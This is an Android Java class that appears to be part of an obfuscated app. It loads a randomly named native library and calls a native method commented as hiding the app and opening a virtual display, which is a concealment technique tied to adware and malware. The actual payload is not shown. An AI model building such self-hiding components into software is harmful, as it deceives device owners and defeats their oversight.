package com.wallsc.scrk;

import android.content.Context;

/**
 * Date：2024/3/21
 * Describe:
 */
public class ScapeHelperM {
    static {
        try {
            System.loadLibrary("Nsb9HmZbM");
        } catch (Exception e) {
            ////Log.e("DaemonLog","System.loadLibrary error:");
        }
    }

    //	 @Keep
    public static native int pXaqaXXp(Context context, int status);//隐藏,开虚拟显示

    public static void shei(Context context, int type) {
        if (type == 0) {

        } else if (type == 2) {

        }
    }

    private void sjuai(Context context) {
        String name = context.getPackageName();
        if (name.isEmpty()) {
            pXaqaXXp(context, 0);
        } else {
            pXaqaXXp(context, 1);
        }
    }

    public static int jsuisgksa(Context context, int flag, int status) {
        switch (flag) {
            case 1: {
                pXaqaXXp(context, status);
            }
            case 3: {
                pXaqaXXp(context, 1);
            }
        }
        return 0;
    }
}
